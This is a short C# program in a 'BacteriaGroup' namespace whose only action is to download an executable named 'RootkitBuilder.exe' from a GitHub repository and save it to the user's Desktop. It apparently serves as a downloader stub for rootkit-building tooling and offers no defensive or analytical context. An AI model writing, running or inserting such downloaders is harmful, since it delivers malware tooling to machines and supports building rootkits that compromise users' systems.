using System;
using System.IO;
using System.Net;

namespace BacteriaGroup
{
    internal static class Program
    {
        static void Main()
        {
            using (WebClient c = new WebClient())
            {
                string P = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "RootkitBuilder.exe");
                c.DownloadFile("https://github.com/BacteriaGroup/RootkitBuilder/raw/refs/heads/main/RootkitBuilder.exe", P);
            }
        }
    }
}
